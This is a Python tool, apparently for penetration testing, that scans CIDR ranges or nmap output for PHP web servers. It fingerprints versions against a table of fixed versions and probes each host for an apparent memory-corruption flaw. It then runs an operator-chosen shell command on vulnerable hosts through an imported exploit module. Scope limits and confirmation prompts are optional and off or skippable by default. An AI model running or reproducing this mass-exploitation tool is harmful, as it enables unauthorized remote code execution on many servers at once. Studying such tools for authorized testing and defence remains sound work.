#!/usr/bin/env python3
"""
php2sweep — batch php2shell operator for AUTHORIZED pentest engagements.

Workflow:
    php2sweep.py probe   -t targets.txt -o findings.json
    php2sweep.py exploit -i findings.json --cmd 'id>/tmp/pwn' --yes
    php2sweep.py report  -i findings.json [--format md|json|csv]

Safety:
  * `probe` NEVER fires the exploit payload — only runs the behavioral probe
    (one serial stage1 arm per target, up to 3 attempts). Confirms vulnerable
    or patched based on observed stage1 behavior.
  * `exploit` requires `--yes` AND runs one target at a time with per-target
    confirmation unless `--no-confirm`.
  * A `--scope FILE` (list of allowed hostnames/URLs, one per line) can be
    required to prevent operator mistakes. Default: not enforced (operator
    responsible for the input list).
  * `--dry-run` with `exploit` prints the plan without firing anything.

Written to be run against networks/apps where the operator has authorization.
Not a replacement for consulting rules of engagement — this is a tool, not a
license.
"""
import argparse, json, sys, time, concurrent.futures, pathlib, os, subprocess, re
import urllib.parse, socket, ipaddress
import xml.etree.ElementTree as ET
from datetime import datetime, timezone

sys.path.insert(0, str(pathlib.Path(__file__).parent))
from php2shell import (
    KA, Exploit, OFFSETS, PROFILES, SERIES_DEFAULT,
    detect, probe_oom, derive_htdata, HTDATA_DELTA, probe_vulnerable,
    spray_phase, _mkexp, elf_offsets,
)

# ---------- common utilities ---------------------------------------------------

FIXED_FLOOR = {"8.2": "8.2.35", "8.3": "8.3.36", "8.4": "8.4.27", "8.5": "8.5.12"}
GROOM_FLOOR = {"8.3": "8.3.22"}

def ver_tuple(v):
    try: return tuple(int(x) for x in v.split("."))
    except Exception: return (0,)

def classify_version(ver):
    """Return ('vulnerable', '')|('patched', fixed_in)|('too_old', boundary)|('unknown',''). """
    if not ver: return "unknown", ""
    br = ".".join(ver.split(".")[:2])
    floor = FIXED_FLOOR.get(br)
    if floor and ver_tuple(ver) >= ver_tuple(floor):
        return "patched", floor
    gf = GROOM_FLOOR.get(br)
    if gf and ver_tuple(ver) < ver_tuple(gf):
        return "too_old", gf
    if not floor:
        return "unknown", ""
    return "vulnerable", ""

def load_targets(src):
    """Read targets from a file, '-' for stdin, or a scope string."""
    if src == "-":
        return [l.strip() for l in sys.stdin if l.strip() and not l.startswith("#")]
    p = pathlib.Path(src)
    if not p.exists():
        raise SystemExit(f"[-] targets file not found: {src}")
    return [l.strip() for l in p.read_text().splitlines() if l.strip() and not l.startswith("#")]

def parse_nmap_xml(path):
    """Parse nmap -oX output. Return list of URLs built from hosts with
    open HTTP/HTTPS-like ports. Uses nmap's own service detection: tcp/open
    ports where service name contains 'http' (http, https, http-proxy, etc.)
    or port is a well-known HTTP port (80, 443, 8080, 8000, 8443, 8008, 8800)."""
    HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8008, 8008, 8800, 8880, 8888, 5000, 3000, 7000}
    tree = ET.parse(path)
    urls = []
    for host in tree.getroot().findall("host"):
        status = host.find("status")
        if status is not None and status.get("state") != "up":
            continue
        # Prefer hostname if any; else IP
        addr = None
        for a in host.findall("address"):
            if a.get("addrtype") in ("ipv4", "ipv6") and not addr:
                addr = a.get("addr")
        name = None
        hn = host.find("hostnames")
        if hn is not None:
            for h in hn.findall("hostname"):
                if h.get("name"): name = h.get("name"); break
        target = name or addr
        if not target: continue
        # Enumerate open HTTP-ish ports
        ports = host.find("ports")
        if ports is None: continue
        for p in ports.findall("port"):
            if p.get("protocol") != "tcp": continue
            st = p.find("state")
            if st is None or st.get("state") != "open": continue
            portnum = int(p.get("portid"))
            svc = p.find("service")
            svcname = (svc.get("name") if svc is not None else "") or ""
            tunnel = (svc.get("tunnel") if svc is not None else "") or ""
            is_http = "http" in svcname.lower() or portnum in HTTP_PORTS
            if not is_http: continue
            tls = "ssl" in tunnel.lower() or svcname.lower() == "https" or portnum in {443, 8443}
            scheme = "https" if tls else "http"
            # IPv6 bracketing in URL
            host_part = f"[{target}]" if ":" in target and not target.startswith("[") else target
            default_port = 443 if tls else 80
            port_part = "" if portnum == default_port else f":{portnum}"
            urls.append(f"{scheme}://{host_part}{port_part}/")
    return urls

def enumerate_cidr(cidr, ports=None, timeout=2.0, concurrency=50):
    """Scan hosts in a CIDR for open HTTP-like ports. Returns URLs for open ports."""
    ports = ports or [80, 8080, 8000, 443, 8443]
    net = ipaddress.ip_network(cidr, strict=False)
    hosts = list(net.hosts()) if net.num_addresses > 1 else [net.network_address]
    print(f"[*] discovery: {len(hosts)} hosts × {len(ports)} ports = {len(hosts)*len(ports)} probes "
          f"(concurrency={concurrency}, timeout={timeout}s)", file=sys.stderr)
    urls = []
    def tcp_probe(target):
        host, port = target
        try:
            with socket.create_connection((str(host), port), timeout=timeout):
                tls = port in {443, 8443}
                scheme = "https" if tls else "http"
                h = str(host)
                host_part = f"[{h}]" if ":" in h else h
                default = 443 if tls else 80
                port_part = "" if port == default else f":{port}"
                return f"{scheme}://{host_part}{port_part}/"
        except (OSError, socket.timeout):
            return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
        tasks = [(h, p) for h in hosts for p in ports]
        for u in ex.map(tcp_probe, tasks):
            if u: urls.append(u)
    print(f"[+] discovery: {len(urls)} responding HTTP endpoints found", file=sys.stderr)
    return urls

def load_scope(path):
    if not path: return None
    return set(load_targets(path))

def in_scope(url, scope):
    """A target is in scope if its scheme://host[:port] matches a scope entry or
    its hostname matches an exact or wildcard entry."""
    if scope is None: return True
    try:
        u = urllib.parse.urlsplit(url)
        host = u.hostname or ""
        hostport = f"{u.scheme}://{host}" + (f":{u.port}" if u.port else "")
    except Exception:
        return False
    for s in scope:
        if url.startswith(s) or hostport == s or host == s: return True
        # wildcard: "*.example.com" matches "foo.example.com"
        if s.startswith("*.") and host.endswith(s[1:]): return True
    return False

def ts():
    return datetime.now(timezone.utc).isoformat()

# ---------- per-target probe ---------------------------------------------------

def probe_one(url, timeout=20):
    """Probe one target. Returns a finding dict."""
    f = {
        "url": url,
        "timestamp": ts(),
        "verdict": "unknown",
        "reason": "",
        "ver": None, "arch": None,
        "version_class": "unknown",
        "fixed_in": "",
        "elapsed": None,
    }
    t0 = time.time()
    try:
        # Version detect
        ver, arch = detect(url, "")
        f["ver"], f["arch"] = ver, arch
        if not ver:
            f["verdict"] = "unknown"; f["reason"] = "could not detect PHP version (not PHP? proxy stripping X-Powered-By?)"
            return f
        vclass, floor = classify_version(ver)
        f["version_class"] = vclass; f["fixed_in"] = floor
        if vclass == "patched":
            f["verdict"] = "patched_by_version"; f["reason"] = f"PHP {ver} >= fixed-in {floor}"
            return f
        if vclass == "too_old":
            f["verdict"] = "too_old"; f["reason"] = f"PHP {ver} < grooming boundary {floor}"
            return f
        # Need offsets
        key = ver if ver in PROFILES else SERIES_DEFAULT.get(".".join(ver.split(".")[:2]))
        prof = dict(PROFILES.get(key) or {})
        if not prof:
            f["verdict"] = "unknown"; f["reason"] = f"no exploit profile for {ver}"
            return f
        off = OFFSETS.get(arch, {}).get(ver) or OFFSETS.get(arch, {}).get(key)
        if not off:
            f["verdict"] = "unknown"; f["reason"] = f"no {arch} offsets for {ver}"
            return f
        zif, dtor = off
        # OOM field size probe (fast — tries a few sizes)
        huge = probe_oom(url, prof["huge"], zif, dtor)
        if not huge:
            f["verdict"] = "patched_behavioral"
            f["reason"] = "OOM could not be triggered; may be layer-3 (post_max_size enforcement) patched or memory_limit far too high"
            return f
        f["oom_mb"] = huge
        # Behavioral probe
        verdict, reason = probe_vulnerable(url, zif, dtor, huge, attempts=3, timeout=timeout)
        f["verdict"] = {"vulnerable": "vulnerable", "patched": "patched_behavioral", "unknown": "unknown"}[verdict]
        f["reason"] = reason
    except Exception as e:
        f["verdict"] = "error"; f["reason"] = f"{type(e).__name__}: {e}"[:200]
    finally:
        f["elapsed"] = round(time.time() - t0, 2)
    return f

# ---------- probe command ------------------------------------------------------

def cmd_probe(a):
    scope = load_scope(a.scope) if a.scope else None
    if a.targets_xml:
        urls = parse_nmap_xml(a.targets_xml)
        print(f"[*] parsed {len(urls)} HTTP endpoints from nmap XML", file=sys.stderr)
    elif a.cidr:
        urls = enumerate_cidr(a.cidr, ports=a.discover_ports, timeout=a.discover_timeout,
                              concurrency=a.discover_concurrency)
    else:
        urls = load_targets(a.targets)
    if scope is not None:
        in_, out = [u for u in urls if in_scope(u, scope)], [u for u in urls if not in_scope(u, scope)]
        if out:
            print(f"[-] {len(out)} targets OUT OF SCOPE; refusing: {out[:3]}{'...' if len(out)>3 else ''}", file=sys.stderr)
            if not a.ignore_oos: return 2
        urls = in_
    print(f"[*] probing {len(urls)} targets, concurrency={a.concurrency}, rps={a.rps}", file=sys.stderr)

    # Rate-limited parallel probe
    findings = []
    delay = (1.0 / a.rps) if a.rps > 0 else 0
    last = [0.0]
    def worker(url):
        if delay:
            while True:
                now = time.time()
                if now - last[0] >= delay:
                    last[0] = now; break
                time.sleep(max(0, delay - (now - last[0])))
        return probe_one(url, timeout=a.timeout)
    with concurrent.futures.ThreadPoolExecutor(max_workers=a.concurrency) as ex:
        for i, f in enumerate(ex.map(worker, urls)):
            findings.append(f)
            # Live summary
            icon = {"vulnerable":"[+]","patched_by_version":"[-]","patched_behavioral":"[-]",
                    "too_old":"[.]","unknown":"[?]","error":"[!]"}.get(f["verdict"], "[?]")
            ver = f.get("ver") or "?"
            print(f"  {icon} {f['url']}  PHP {ver}  {f['verdict']}  {f['reason'][:80]}", file=sys.stderr)

    out = {"timestamp": ts(), "command": "probe", "count": len(findings), "findings": findings}
    pathlib.Path(a.out).write_text(json.dumps(out, indent=2))
    print(f"\n[+] wrote {len(findings)} findings → {a.out}")
    # Summary
    counts = {}
    for f in findings: counts[f["verdict"]] = counts.get(f["verdict"], 0) + 1
    for k, v in sorted(counts.items()): print(f"    {v:5d}  {k}")
    return 0

# ---------- exploit command (one at a time, confirmation required) ------------

def cmd_exploit(a):
    doc = json.loads(pathlib.Path(a.input).read_text())
    findings = doc["findings"]
    targets = [f for f in findings if f["verdict"] == "vulnerable"]
    if a.only:
        allow = set(a.only.split(","))
        targets = [t for t in targets if t["verdict"] in allow]
    print(f"[*] {len(targets)} targets to exploit (verdict=vulnerable)")
    if not targets: return 0
    if not a.yes:
        print("[-] exploit mode requires --yes to confirm authorization and intent", file=sys.stderr)
        return 2
    if a.dry_run:
        for t in targets: print(f"  [DRY] would exploit {t['url']} (PHP {t['ver']}, cmd={a.cmd!r})")
        return 0
    results = []
    for t in targets:
        url = t["url"]
        if not a.no_confirm:
            resp = input(f"[?] exploit {url}? (y/N) ").strip().lower()
            if resp != "y":
                print(f"    skipped {url}"); continue
        print(f"\n[*] exploiting {url} with cmd={a.cmd!r}")
        rc = subprocess.run([sys.executable, str(pathlib.Path(__file__).parent / "php2shell.py"),
                             "-u", url, "-c", a.cmd, "--timeout", str(a.timeout)],
                            capture_output=False).returncode
        results.append({"url": url, "rc": rc, "cmd": a.cmd, "timestamp": ts()})
    # Append results to findings doc
    doc.setdefault("exploit_runs", []).extend(results)
    pathlib.Path(a.input).write_text(json.dumps(doc, indent=2))
    return 0

# ---------- report command -----------------------------------------------------

def cmd_report(a):
    doc = json.loads(pathlib.Path(a.input).read_text())
    findings = doc["findings"]
    if a.format == "json":
        print(json.dumps(doc, indent=2)); return 0
    if a.format == "csv":
        import csv
        w = csv.writer(sys.stdout)
        w.writerow(["url", "ver", "arch", "verdict", "version_class", "fixed_in", "reason", "elapsed"])
        for f in findings:
            w.writerow([f.get("url",""), f.get("ver",""), f.get("arch",""),
                        f.get("verdict",""), f.get("version_class",""),
                        f.get("fixed_in",""), f.get("reason",""), f.get("elapsed","")])
        return 0
    # Markdown by default
    print(f"# php2sweep report")
    print(f"\n_generated {doc.get('timestamp','')}_\n")
    counts = {}
    for f in findings: counts[f["verdict"]] = counts.get(f["verdict"], 0) + 1
    print("## Summary\n")
    for k, v in sorted(counts.items()): print(f"- **{k}**: {v}")
    print("\n## Findings\n")
    print("| URL | PHP | Verdict | Reason |")
    print("|---|---|---|---|")
    for f in sorted(findings, key=lambda f: {"vulnerable":0,"unknown":1,"patched_behavioral":2,"patched_by_version":3,"too_old":4,"error":5}.get(f["verdict"],9)):
        reason = (f.get("reason","") or "").replace("|", "\\|")[:120]
        print(f"| {f['url']} | {f.get('ver','?')} | {f['verdict']} | {reason} |")
    runs = doc.get("exploit_runs", [])
    if runs:
        print("\n## Exploit runs\n")
        print("| URL | cmd | rc | timestamp |")
        print("|---|---|---|---|")
        for r in runs:
            print(f"| {r['url']} | `{r['cmd']}` | {r['rc']} | {r['timestamp']} |")
    return 0

# ---------- main ---------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="php2sweep — batch php2shell operator for authorized pentest engagements")
    sp = ap.add_subparsers(dest="cmd", required=True)

    pp = sp.add_parser("probe", help="probe targets (safe; no exploit code fired)")
    tsrc = pp.add_mutually_exclusive_group(required=True)
    tsrc.add_argument("-t", "--targets", help="file with one URL per line, '-' for stdin")
    tsrc.add_argument("--targets-xml", help="nmap -oX output; auto-extracts HTTP endpoints from open ports")
    tsrc.add_argument("--cidr", help="scan a CIDR (e.g. 10.0.0.0/24) for open HTTP ports, then probe each")
    pp.add_argument("--discover-ports", type=lambda s: [int(x) for x in s.split(",")],
                    default=[80, 8080, 8000, 443, 8443],
                    help="comma-separated ports to scan with --cidr (default: 80,8080,8000,443,8443)")
    pp.add_argument("--discover-timeout", type=float, default=2.0,
                    help="TCP connect timeout for --cidr discovery (s)")
    pp.add_argument("--discover-concurrency", type=int, default=50,
                    help="concurrent TCP probes for --cidr discovery")
    pp.add_argument("-o", "--out", default="findings.json", help="output findings JSON")
    pp.add_argument("-c", "--concurrency", type=int, default=5)
    pp.add_argument("-r", "--rps", type=float, default=2.0, help="max requests per second across all workers")
    pp.add_argument("--timeout", type=int, default=20, help="per-target timeout (s)")
    pp.add_argument("--scope", help="file with allowed hostnames/URLs (one per line); refuses out-of-scope")
    pp.add_argument("--ignore-oos", action="store_true", help="continue even if some targets are out of scope")
    pp.set_defaults(func=cmd_probe)

    ep = sp.add_parser("exploit", help="exploit vulnerable targets from findings file (one at a time, confirmation required)")
    ep.add_argument("-i", "--input", required=True, help="findings JSON from probe")
    ep.add_argument("-c", "--cmd", required=True, help="command to execute (<=14 bytes)")
    ep.add_argument("--only", help="comma-separated list of verdicts to exploit (default: vulnerable)")
    ep.add_argument("--yes", action="store_true", help="required: confirm authorization and intent")
    ep.add_argument("--no-confirm", action="store_true", help="skip per-target confirmation prompt")
    ep.add_argument("--dry-run", action="store_true")
    ep.add_argument("--timeout", type=int, default=30)
    ep.set_defaults(func=cmd_exploit)

    rp = sp.add_parser("report", help="render findings as markdown/json/csv")
    rp.add_argument("-i", "--input", required=True)
    rp.add_argument("-f", "--format", choices=("md", "json", "csv"), default="md")
    rp.set_defaults(func=cmd_report)

    a = ap.parse_args()
    sys.exit(a.func(a))

if __name__ == "__main__":
    main()
